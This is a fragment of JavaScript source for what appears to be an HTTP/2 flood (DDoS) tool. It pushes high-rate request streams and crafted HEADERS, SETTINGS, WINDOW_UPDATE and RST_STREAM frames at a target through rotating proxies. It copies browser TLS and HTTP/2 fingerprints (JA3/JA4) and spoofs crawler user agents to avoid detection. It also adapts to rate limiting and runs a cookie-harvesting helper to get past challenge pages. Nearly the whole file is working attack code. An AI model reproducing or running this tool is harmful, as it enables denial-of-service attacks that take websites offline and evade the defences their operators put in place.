    stats.totalRequests++;
    stats.lastRequestTime = Date.now();
    
    const proxyAddr = options.ratelimit ? getNextAvailableProxy() : randomElement(proxies);
    const parsedProxy = parseProxy(proxyAddr);
    const proxyIP = parsedProxy.host;
    
    if (!options.auth && isProxyInRetryWait(proxyIP)) {
        const waitTimeRemaining = Math.ceil((proxyStats[proxyIP].retryAfter - Date.now()) / 1000);
        if (waitTimeRemaining > 0) {
            return;
        }
    }
    
    if (!options.auth) trackProxyRequest(proxyIP);
    
    const parsedPort = parsedTarget.protocol == "https:" ? "443" : "80";
    
    const browser = getRandomBrowser();
    
    const headers = generateHeaders(browser, parsedTarget);
    
    const browserH2Settings = h2Settings(browser);
    
    const clientHelloData = createRealisticClientHello(browser);
    
    const proxyOptions = {
        host: parsedProxy.host,
        port: parsedProxy.port,
        address: parsedTarget.host,
        timeout: 10,
        authHeader: parsedProxy.authHeader
    };

    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error) {
          stats.errors++;
          
          if (cluster.isWorker) {
            try {
              process.send({
                type: 'error'
              });
            } catch (e) {
            }
          }
          return;
        }

        connection.setKeepAlive(true, 100000);
        connection.setNoDelay(true);

        const settingsObj = {
           enablePush: (browserH2Settings.SETTINGS_ENABLE_PUSH || HTTP2_SETTINGS_DEFAULTS[HTTP2_SETTINGS.ENABLE_PUSH]) === 1,
           initialWindowSize: browserH2Settings.SETTINGS_INITIAL_WINDOW_SIZE || HTTP2_SETTINGS_DEFAULTS[HTTP2_SETTINGS.INITIAL_WINDOW_SIZE],
           headerTableSize: browserH2Settings.SETTINGS_HEADER_TABLE_SIZE || HTTP2_SETTINGS_DEFAULTS[HTTP2_SETTINGS.HEADER_TABLE_SIZE],
           maxConcurrentStreams: browserH2Settings.SETTINGS_MAX_CONCURRENT_STREAMS || HTTP2_SETTINGS_DEFAULTS[HTTP2_SETTINGS.MAX_CONCURRENT_STREAMS],
           maxHeaderListSize: browserH2Settings.SETTINGS_MAX_HEADER_LIST_SIZE || HTTP2_SETTINGS_DEFAULTS[HTTP2_SETTINGS.MAX_HEADER_LIST_SIZE],
           maxFrameSize: browserH2Settings.SETTINGS_MAX_FRAME_SIZE || HTTP2_SETTINGS_DEFAULTS[HTTP2_SETTINGS.MAX_FRAME_SIZE],
           enableConnectProtocol: (browserH2Settings.SETTINGS_ENABLE_CONNECT_PROTOCOL || HTTP2_SETTINGS_DEFAULTS[HTTP2_SETTINGS.ENABLE_CONNECT_PROTOCOL]) === 1,
           enableRfc7540Priorities: (browserH2Settings.SETTINGS_NO_RFC7540_PRIORITIES || HTTP2_SETTINGS_DEFAULTS[HTTP2_SETTINGS.NO_RFC7540_PRIORITIES]) === 0,
           enableMetadata: (browserH2Settings.SETTINGS_ENABLE_METADATA || HTTP2_SETTINGS_DEFAULTS[HTTP2_SETTINGS.ENABLE_METADATA]) === 1
        };
        
        const settings = transformSettings([
            ["SETTINGS_HEADER_TABLE_SIZE", settingsObj.headerTableSize],
            ["SETTINGS_ENABLE_PUSH", settingsObj.enablePush ? 1 : 0],
            ["SETTINGS_MAX_CONCURRENT_STREAMS", settingsObj.maxConcurrentStreams],
            ["SETTINGS_INITIAL_WINDOW_SIZE", settingsObj.initialWindowSize],
            ["SETTINGS_MAX_FRAME_SIZE", settingsObj.maxFrameSize],
            ["SETTINGS_MAX_HEADER_LIST_SIZE", settingsObj.maxHeaderListSize],
            ["SETTINGS_ENABLE_CONNECT_PROTOCOL", settingsObj.enableConnectProtocol ? 1 : 0],
            ["SETTINGS_NO_RFC7540_PRIORITIES", settingsObj.enableRfc7540Priorities ? 0 : 1],
            ["SETTINGS_ENABLE_METADATA", settingsObj.enableMetadata ? 1 : 0]
        ]);
        
        const tlsVersion = clientHelloData.tlsVersions;

        const tlsOptions = {
           port: parsedPort,
           secure: true,
           ALPNProtocols: clientHelloData.alpnProtocols,
           ciphers: clientHelloData.ciphers,
           sigalgs: clientHelloData.signatureAlgorithms,
           requestCert: true,
           socket: connection,
           ecdhCurve: clientHelloData.ecdhCurve,
           honorCipherOrder: true,
           host: parsedTarget.host,
           rejectUnauthorized: false,
           secureOptions: secureOptions,
           secureContext: secureContext,
           servername: parsedTarget.host,
           secureProtocol: secureProtocol,
           minVersion: tlsVersion.min,
           maxVersion: tlsVersion.max,
           ja3: clientHelloData.ja3.ja3,
           ja3String: clientHelloData.ja3.ja3,
           ja3Hash: clientHelloData.ja3.ja3_hash,
           ja4: clientHelloData.ja4.ja4,
           ja4String: clientHelloData.ja4.ja4,
           ja4Hash: clientHelloData.ja4.ja4_hash,
           pluginsInfo: clientHelloData.plugins,
           appData: clientHelloData.appData,
           sessionTicket: clientHelloData.plugins.count > 0,
           sessionTimeout: 300 + (clientHelloData.plugins.count * 10)
        };

        const tlsConn = tls.connect(parsedPort, parsedTarget.host, tlsOptions); 

        tlsConn.allowHalfOpen = true;
        tlsConn.setNoDelay(true);
        tlsConn.setKeepAlive(true, 60 * 10000);
        tlsConn.setMaxListeners(0);
        
        let hpack = new HPACK();

        const http2SessionOptions = createHttp2SessionOptions(browser, clientHelloData);

        const client = http2.connect(parsedTarget.href, {
           protocol: "https:",
           settings: settingsObj,
           createConnection: () => tlsConn,
           socket: connection,
           fingerprint: clientHelloData,
           ja3String: clientHelloData.ja3.ja3,
           ja3Hash: clientHelloData.ja3.ja3_hash,
           ja4: clientHelloData.ja4.ja4,
           ja4String: clientHelloData.ja4.ja4,
           ja4Hash: clientHelloData.ja4.ja4_hash,
           plugins: clientHelloData.plugins,
           ...http2SessionOptions,
           defaultPriority: getBrowserPriorityData(browser)
        });

        const settingsFrame = Object.fromEntries(settings);
        client.settings(settingsFrame);

        client.setMaxListeners(0);

        const updateWindow = () => {
            const windowSize = Math.floor(Math.random() * (20000000 - 15000000 + 1)) + 15000000;
            try {
                if (client && !client.destroyed) {
                    const dynamicSettings = {};
                    dynamicSettings[HTTP2_SETTINGS.INITIAL_WINDOW_SIZE] = windowSize;
                    
                    const settingsFrame = createSettingsFrame(dynamicSettings);
                    client.socket.write(settingsFrame);
                    
                    const windowUpdateFrame = createWindowUpdateFrame(0, windowSize);
                    client.socket.write(windowUpdateFrame);
                    
                    client.setLocalWindowSize(windowSize);
                    
                    if (Math.random() < 0.5) {
                        for (let i = 1; i <= 5; i++) {
                            const streamId = Math.floor(Math.random() * 10) + 1;
                            const increment = Math.floor(Math.random() * 15663105) + 15663105;
                            const streamWindowUpdate = createWindowUpdateFrame(streamId, increment);
                            client.socket.write(streamWindowUpdate);
                        }
                    }
                }
            } catch (e) {
            }
        };
        
        const updateWindowInterval = setInterval(updateWindow, Math.floor(Math.random() * 5000) + 5000);

        client.on("connect", () => {
            if (clientHelloData.plugins && clientHelloData.plugins.count > 0) {
                try {
                    const pluginSpecificSettings = {};
                    const pluginCount = clientHelloData.plugins.count;
                    
                    if (Math.random() < 0.5) {
                        pluginSpecificSettings[HTTP2_SETTINGS.INITIAL_WINDOW_SIZE] = 
                            Math.min(6291456 + (pluginCount * 1000), 8000000);
                    }
                    
                    if (Math.random() < 0.3) {
                        const settingsFrame = createSettingsFrame(pluginSpecificSettings);
                        client.socket.write(settingsFrame);
                    }
                } catch (e) {
                }
            }
            
            const IntervalAttack = setInterval(() => {
                for (let i = 0; i < args.Rate; i++) {
                    const dynamicHeaders = generateHeaders(browser, parsedTarget);
                    
                    const shuffledHeaders = shuffleObject({
                        ...dynamicHeaders,
                        ...(Math.random() < 0.5 ? {"Cache-Control": "max-age=0"} : {}),
                        ...(Math.random() < 0.5 ? {["X-" + randstr(4)]: generateRandomString(5, 10)} : {}),
                        ...(Math.random() < 0.2 ? {"X-Request-ID": crypto.randomBytes(16).toString('hex')} : {}),
                        ...(Math.random() < 0.3 ? {"X-Frame-Options": "SAMEORIGIN"} : {})
                    });
                    
                    const priority = getBrowserPriorityData(browser);
                    
                    const fixedPriority = getBrowserPriorityData(browser);
                    
                    if (Math.random() < 0.1) {
                        const dynamicSettings = {};
                        dynamicSettings[HTTP2_SETTINGS.INITIAL_WINDOW_SIZE] = Math.floor(Math.random() * 10000000) + 5000000;
                        dynamicSettings[HTTP2_SETTINGS.MAX_CONCURRENT_STREAMS] = Math.floor(Math.random() * 1000) + 100;
                        
                        const settingsFrame = createSettingsFrame(dynamicSettings);
                        client.socket.write(settingsFrame);
                        
                        client.settings(dynamicSettings);
                    }
                    
                    if (Math.random() < 0.15) {
                        const windowSize = Math.floor(Math.random() * 10000000) + 5000000;
                        const windowUpdateFrame = createWindowUpdateFrame(0, windowSize);
                        client.socket.write(windowUpdateFrame);
                    }
                    
                    if (Math.random() < 0.05) {
                        const randomFrame = createRandomFrame();
                        client.socket.write(randomFrame);
                    }
                    
                    const request = client.request(shuffledHeaders, { priority });
                    
                    applyBrowserPriority(request, browser);
                    
                    if (Math.random() < 0.3) {
                        const streamId = request.id || Math.floor(Math.random() * 1000) + 1;
                        const priorityFrame = createPriorityFrame(streamId, getBrowserPriorityData(browser));
                        client.socket.write(priorityFrame);
                    }
                    
                    try {
                        const packed = Buffer.concat([
                            Buffer.from([0x80, 0, 0, 0, 0xFF]),
                            hpack.encode(shuffledHeaders)
                        ]);
                        
                        const streamId = Math.floor(Math.random() * 1000) + 1;
                        
                        const flags = Math.random() < 0.7 ? 
                            HTTP2_FLAGS.END_STREAM | HTTP2_FLAGS.END_HEADERS : 
                            HTTP2_FLAGS.END_HEADERS;
                        
                        if (Math.random() < 0.5) {
                            const headersWithPriority = createHeadersFrameWithPriority(
                                streamId, 
                                shuffledHeaders, 
                                getBrowserPriorityData(browser), 
                                Math.random() < 0.7
                            );
                            
                            if (Math.random() < 0.7) {
                                client.socket.write(headersWithPriority);
                            }
                        } else {
                        const headerFrame = createHTTP2Frame(
                            HTTP2_FRAME_TYPES.HEADERS,
                            flags,
                            streamId,
                            packed
                        );
                        
                        if (Math.random() < 0.7) {
                            client.socket.write(headerFrame);
                            }
                        }
                    } catch (e) {
                    }

                    request.on("response", (headers, flags) => {
                        const statusCode = headers[":status"];
                        
                        const retryAfterHeader = Object.keys(headers).find(
                            h => h.toLowerCase() === "retry-after"
                        );
                        
                        if (statusCode === 429 || statusCode === "429") {
                            if (!options.auth) {
                                if (retryAfterHeader && headers[retryAfterHeader]) {
                                    setProxyRetryAfter(proxyIP, headers[retryAfterHeader]);
                                } else {
                                    setProxyRetryAfter(proxyIP, "5");
                                    if (options.debug) {
                                        console.log(`\x1b[36m[DEBUG]\x1b[0m 429 response without Retry-After header, using default wait`);
                                    }
                                }
                            }
                        } else if (!options.auth && retryAfterHeader && headers[retryAfterHeader]) {
                            setProxyRetryAfter(proxyIP, headers[retryAfterHeader]);
                        }
                        
                        if (!options.auth && options.autoratelimit) {
                            adjustAutoRateLimit(proxyIP, statusCode);
                        }
                        
                        if (!stats.statusCodes[statusCode]) {
                          stats.statusCodes[statusCode] = 0;
                        }
                        stats.statusCodes[statusCode]++;
                        
                        if (cluster.isWorker) {
                          try {
                            process.send({ 
                              type: 'status_code', 
                              code: statusCode 
                            });
                          } catch (e) {
                          }
                        }
                        
                        if (options.debug && (statusCode === '200' || statusCode === '403' || statusCode === 200 || statusCode === 403)) {
                            saveDebugHeaders(String(statusCode), shuffledHeaders, parsedTarget.href);
                        }
                        
                        if (Math.random() < 0.3) {
                            const rstStreamPayload = Buffer.alloc(4);
                            const errorCode = Math.random() < 0.5 ? 
                                HTTP2_ERROR_CODES.CANCEL : 
                                HTTP2_ERROR_CODES.NO_ERROR;
                            
                            rstStreamPayload.writeUInt32BE(errorCode, 0);
                            const rstFrame = createHTTP2Frame(
                                HTTP2_FRAME_TYPES.RST_STREAM,
                                0,
                                request.id,
                                rstStreamPayload
                            );
                            
                            client.socket.write(rstFrame);
                        }
                        
                        request.close();
                        request.destroy();
                        return;
                    });
                    
                    request.end();
                }
            }, 550); 

        client.on("close", () => {
                clearInterval(IntervalAttack);
                clearInterval(updateWindowInterval);
                
                try {
                    const lastStreamId = Math.floor(Math.random() * 1000);
                    const goawayPayload = Buffer.alloc(8);
                    goawayPayload.writeUInt32BE(lastStreamId, 0);
                    goawayPayload.writeUInt32BE(HTTP2_ERROR_CODES.NO_ERROR, 4);
                    
                    const goawayFrame = createHTTP2Frame(
                        HTTP2_FRAME_TYPES.GOAWAY,
                        0,
                        0,
                        goawayPayload
                    );
                    
                    client.socket.write(goawayFrame);
                } catch (e) {
                }
                
            client.destroy();
            connection.destroy();
            return;
            });
        });

        client.on("error", error => {
            clearInterval(updateWindowInterval);
            stats.errors++;
            
            if (cluster.isWorker) {
              try {
                process.send({
                  type: 'error'
                });
              } catch (e) {
              }
            }
            
            client.destroy();
            connection.destroy();
            return;
        });
    });
}

process.on('uncaughtException', error => {
  stats.errors++;
  if (cluster.isWorker) {
    try {
      process.send({
        type: 'error'
      });
    } catch (e) {
    }
  }
});

process.on('unhandledRejection', error => {
  stats.errors++;
  if (cluster.isWorker) {
    try {
      process.send({
        type: 'error'
      });
    } catch (e) {
    }
  }
});

if (process.env.DEBUG) {
  console.log(`[DEBUG] Browser configurations loaded: ${browsers.join(", ")}`);
  console.log(`[DEBUG] Proxy count: ${proxies.length}`);
}

const createHTTP2Frame = (type, flags, streamId, payload) => {
    const frame = Buffer.alloc(9 + payload.length);
    
    frame.writeUInt8((payload.length >> 16) & 0xFF, 0);
    frame.writeUInt8((payload.length >> 8) & 0xFF, 1);
    frame.writeUInt8(payload.length & 0xFF, 2);
    
    frame.writeUInt8(type, 3);
    
    frame.writeUInt8(flags, 4);
    
    frame.writeUInt32BE(streamId & 0x7FFFFFFF, 5);
    
    payload.copy(frame, 9);
    
    return frame;
};

const createSettingsFrame = (settings, flags = 0) => {
    const numSettings = Object.keys(settings).length;
    const payload = Buffer.alloc(numSettings * 6);
    
    let offset = 0;
    for (const [id, value] of Object.entries(settings)) {
        payload.writeUInt16BE(Number(id), offset);
        payload.writeUInt32BE(Number(value), offset + 2);
        offset += 6;
    }
    
    return createHTTP2Frame(HTTP2_FRAME_TYPES.SETTINGS, flags, 0, payload);
};

const createWindowUpdateFrame = (streamId, windowSizeIncrement) => {
    const payload = Buffer.alloc(4);
    payload.writeUInt32BE(windowSizeIncrement & 0x7FFFFFFF, 0);
    return createHTTP2Frame(HTTP2_FRAME_TYPES.WINDOW_UPDATE, 0, streamId, payload);
};

const createRandomFrame = () => {
    const frameTypes = [
        HTTP2_FRAME_TYPES.PING,
        HTTP2_FRAME_TYPES.WINDOW_UPDATE,
        HTTP2_FRAME_TYPES.SETTINGS
    ];
    
    const type = frameTypes[Math.floor(Math.random() * frameTypes.length)];
    let payload;
    let streamId = 0;
    
    switch (type) {
        case HTTP2_FRAME_TYPES.PING:
            payload = crypto.randomBytes(8);
            break;
        case HTTP2_FRAME_TYPES.WINDOW_UPDATE:
            payload = Buffer.alloc(4);
            streamId = Math.floor(Math.random() * 10) + 1;
            payload.writeUInt32BE(Math.floor(Math.random() * 10000000) + 1000000, 0);
            break;
        case HTTP2_FRAME_TYPES.SETTINGS:
            payload = Buffer.alloc(6);
            payload.writeUInt16BE(HTTP2_SETTINGS.INITIAL_WINDOW_SIZE, 0);
            payload.writeUInt32BE(Math.floor(Math.random() * 10000000) + 1000000, 2);
            break;
        default:
            payload = Buffer.alloc(0);
    }
    
    return createHTTP2Frame(type, 0, streamId, payload);
};

const createPriorityFrame = (streamId, priorityData) => {
    const payload = Buffer.alloc(5);
    
    const exclusiveBit = priorityData.exclusive ? 0x80000000 : 0;
    const dependencyWithE = (priorityData.depends_on & 0x7FFFFFFF) | exclusiveBit;
    payload.writeUInt32BE(dependencyWithE, 0);
    
    payload.writeUInt8(priorityData.weight - 1, 4);
    
    return createHTTP2Frame(HTTP2_FRAME_TYPES.PRIORITY, 0, streamId, payload);
};

const createHeadersFrameWithPriority = (streamId, headers, priorityData, endStream = true) => {
    let hpack = new HPACK();
    const encodedHeaders = hpack.encode(headers);
    
    const prioritySize = priorityData ? 5 : 0;
    
    const payload = Buffer.alloc(prioritySize + encodedHeaders.length);
    
    let offset = 0;
    
    if (priorityData) {
        const exclusiveBit = priorityData.exclusive ? 0x80000000 : 0;
        const dependencyWithE = (priorityData.depends_on & 0x7FFFFFFF) | exclusiveBit;
        payload.writeUInt32BE(dependencyWithE, 0);
        
        payload.writeUInt8(priorityData.weight - 1, 4);
        
        offset = 5;
    }
    
    encodedHeaders.copy(payload, offset);
    
    let flags = 0;
    if (endStream) flags |= HTTP2_FLAGS.END_STREAM;
    flags |= HTTP2_FLAGS.END_HEADERS;
    if (priorityData) flags |= HTTP2_FLAGS.PRIORITY;
    
    return createHTTP2Frame(HTTP2_FRAME_TYPES.HEADERS, flags, streamId, payload);
};

function createHttp2SessionOptions(browser, clientHello) {
    const browserSettings = h2Settings(browser);
    const defaultSettings = { ...HTTP2_SETTINGS_DEFAULTS };
    
    const baseSessionOptions = {
        maxSessionMemory: 10000,
        maxDeflateDynamicTableSize: 4294967295,
        maxOutstandingPings: 10,
        maxHeaderPairs: 128,
        maxOutstandingSettings: 1000,
        maxReservedRemoteStreams: 200,
        peerMaxConcurrentStreams: browserSettings.SETTINGS_MAX_CONCURRENT_STREAMS || defaultSettings[HTTP2_SETTINGS.MAX_CONCURRENT_STREAMS],
        paddingStrategy: 0,
        maxHeaderListSize: browserSettings.SETTINGS_MAX_HEADER_LIST_SIZE || defaultSettings[HTTP2_SETTINGS.MAX_HEADER_LIST_SIZE],
        maxFrameSize: browserSettings.SETTINGS_MAX_FRAME_SIZE || defaultSettings[HTTP2_SETTINGS.MAX_FRAME_SIZE],
        maxConcurrentStreams: browserSettings.SETTINGS_MAX_CONCURRENT_STREAMS || defaultSettings[HTTP2_SETTINGS.MAX_CONCURRENT_STREAMS],
        headerTableSize: browserSettings.SETTINGS_HEADER_TABLE_SIZE || defaultSettings[HTTP2_SETTINGS.HEADER_TABLE_SIZE],
        enableConnectProtocol: (browserSettings.SETTINGS_ENABLE_CONNECT_PROTOCOL === 1) || (defaultSettings[HTTP2_SETTINGS.ENABLE_CONNECT_PROTOCOL] === 1),
        enablePush: (browserSettings.SETTINGS_ENABLE_PUSH === 1) || (defaultSettings[HTTP2_SETTINGS.ENABLE_PUSH] === 1),
        enableUserAgentHeader: false
    };
    
    if (clientHello.plugins && clientHello.plugins.count > 0) {
        const pluginCount = clientHello.plugins.count;
        
        return {
            ...baseSessionOptions,
            maxSessionMemory: baseSessionOptions.maxSessionMemory + (pluginCount * 100),
            maxReservedRemoteStreams: baseSessionOptions.maxReservedRemoteStreams + (pluginCount * 2),
            peerMaxConcurrentStreams: Math.min(pluginCount * 50 + baseSessionOptions.peerMaxConcurrentStreams, 500),
            paddingStrategy: pluginCount > 2 ? 1 : 0,
            autoDecompressData: true,
            initialWindowSize: browserSettings.SETTINGS_INITIAL_WINDOW_SIZE || defaultSettings[HTTP2_SETTINGS.INITIAL_WINDOW_SIZE]
        };
    }
    
    if (browser === 'chrome') {
        return {
            ...baseSessionOptions,
            maxSessionMemory: 15000,
            initialWindowSize: browserSettings.SETTINGS_INITIAL_WINDOW_SIZE || 6291456
        };
    } else {
        return {
            ...baseSessionOptions,
            maxSessionMemory: 8000,
            initialWindowSize: browserSettings.SETTINGS_INITIAL_WINDOW_SIZE || 131072,
            maxHeaderListSize: browserSettings.SETTINGS_MAX_HEADER_LIST_SIZE || 65536
        };
    }
}

function runGetCookieScript(targetUrl) {
    return new Promise((resolve) => {
        console.log(`\x1b[36m[INFO]\x1b[0m Automatically running getcookie.js for ${targetUrl}...`);
        
        const command = `node ./getcookie.js ${targetUrl} --proxy http.txt`;
        
        const childProcess = exec(command, (error, stdout, stderr) => {
            if (error) {
                console.log(`\x1b[31m[ERROR]\x1b[0m getcookie.js execution failed: ${error.message}`);
                resolve(false);
                return;
            }
            
            if (stderr) {
                console.log(`\x1b[33m[WARNING]\x1b[0m getcookie.js stderr: ${stderr}`);
            }
            
            if (stdout.includes('Cookies saved to file:')) {
                console.log(`\x1b[32m[SUCCESS]\x1b[0m getcookie.js completed successfully`);
                resolve(true);
            } else {
                console.log(`\x1b[33m[WARNING]\x1b[0m getcookie.js did not save cookies`);
                resolve(false);
            }
        });
        
        childProcess.stdout.on('data', (data) => {
            process.stdout.write(data);
        });
        
        childProcess.stderr.on('data', (data) => {
            process.stderr.write(data);
        });
    });
}

const botUserAgents = [
    "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; GPTBot/1.2; +https://openai.com/gptbot)",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
    "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
    "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
    "Mozilla/5.0 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)",
    "Mozilla/5.0 (compatible; Baiduspider-image/2.0; +http://www.baidu.com/search/spider.html)",
];

function trackProxyRequest(proxyIP) {
    if (!proxyStats[proxyIP]) {
        proxyStats[proxyIP] = {
            requests: 0,
            retryAfter: 0,
            lastRequestTime: 0,
            autoRateLimit: AUTO_RATE_LIMIT_DEFAULT,
            successCount: 0,
            errorCount: 0
        };
    }
    proxyStats[proxyIP].requests++;
    proxyStats[proxyIP].lastRequestTime = Date.now();
    return proxyStats[proxyIP].requests;
}

function isProxyRateLimited(proxyIP) {
    if (!proxyStats[proxyIP]) return false;
    
    if (options.autoratelimit) {
        return proxyStats[proxyIP].requests >= proxyStats[proxyIP].autoRateLimit;
    } else if (options.ratelimit) {
        return proxyStats[proxyIP].requests >= options.ratelimit;
    }
    
    return false;
}

function adjustAutoRateLimit(proxyIP, statusCode) {
    if (!options.autoratelimit || !proxyStats[proxyIP]) return;
    
    let currentLimit = proxyStats[proxyIP].autoRateLimit;
    
    if (statusCode >= 200 && statusCode < 400) {
        proxyStats[proxyIP].successCount++;
        
        if (proxyStats[proxyIP].successCount % 5 === 0) {
            currentLimit = Math.ceil(currentLimit * AUTO_RATE_LIMIT_INCREASE);
        }
    } else if (statusCode >= 400) {
        proxyStats[proxyIP].errorCount++;
        
        currentLimit = Math.max(AUTO_RATE_LIMIT_MIN, Math.floor(currentLimit * AUTO_RATE_LIMIT_DECREASE));
    }
    
    proxyStats[proxyIP].autoRateLimit = currentLimit;
}

function setProxyRetryAfter(proxyIP, retryAfterValue) {
    if (!proxyStats[proxyIP]) {
        proxyStats[proxyIP] = {
            requests: 0,
            retryAfter: 0,
            lastRequestTime: 0,
            autoRateLimit: AUTO_RATE_LIMIT_DEFAULT,
            successCount: 0,
            errorCount: 0
        };
    }
    
    let retryAfterSeconds = 0;
    
    if (!isNaN(retryAfterValue)) {
        retryAfterSeconds = parseInt(retryAfterValue);
    } else {
        try {
            const retryDate = new Date(retryAfterValue);
            retryAfterSeconds = Math.max(0, Math.floor((retryDate - new Date()) / 1000));
        } catch (e) {
            retryAfterSeconds = 1;
        }
    }
    
    const MIN_RETRY_SECONDS = 3;
    retryAfterSeconds = Math.max(retryAfterSeconds, MIN_RETRY_SECONDS);
    
    proxyStats[proxyIP].retryAfter = Date.now() + (retryAfterSeconds * 1000);
    
    if (options.debug) {
        console.log(`\x1b[36m[DEBUG]\x1b[0m Proxy ${proxyIP} set to wait for ${retryAfterSeconds}s after 429 response`);
    }
    
    if (cluster.isWorker) {
        try {
            process.send({
                type: 'retry_after',
                value: 1
            });
        } catch (e) {
        }
    }
}

function isProxyInRetryWait(proxyIP) {
    if (!proxyStats[proxyIP]) return false;
    
    const isWaiting = Date.now() < proxyStats[proxyIP].retryAfter;
    
    if (!isWaiting && proxyStats[proxyIP].retryAfter > 0 && options.debug) {
        const waitTime = Math.round((proxyStats[proxyIP].retryAfter - proxyStats[proxyIP].lastRequestTime) / 1000);
        console.log(`\x1b[36m[DEBUG]\x1b[0m Proxy ${proxyIP} released after waiting ${waitTime}s`);
        if (!isWaiting) proxyStats[proxyIP].retryAfter = 0;
    }
    
    return isWaiting;
}

function getNextAvailableProxy() {
    let availableProxies = proxies.filter(proxy => {
        const parsedProxy = parseProxy(proxy);
        const proxyIP = parsedProxy.host;
        return !isProxyRateLimited(proxyIP) && !isProxyInRetryWait(proxyIP);
    });
    
    if (availableProxies.length === 0) {
        return randomElement(proxies);
    }
    
    return randomElement(availableProxies);
}

function getBrowserPriorityData(browser) {
    if (browser === 'firefox') {
        return {
            exclusive: 0,
            depends_on: 0,
            weight: 42
        };
    } else {
        return {
            exclusive: 1,
            depends_on: 0,
            weight: 256
        };
    }
}

function applyBrowserPriority(stream, browser) {
    if (!stream || typeof stream.priority !== 'function') return;
    
    try {
        const priorityData = getBrowserPriorityData(browser);
        
        stream.priority({
            exclusive: priorityData.exclusive,
            parent: priorityData.depends_on,
            weight: priorityData.weight
        });
    } catch (e) {
    }
}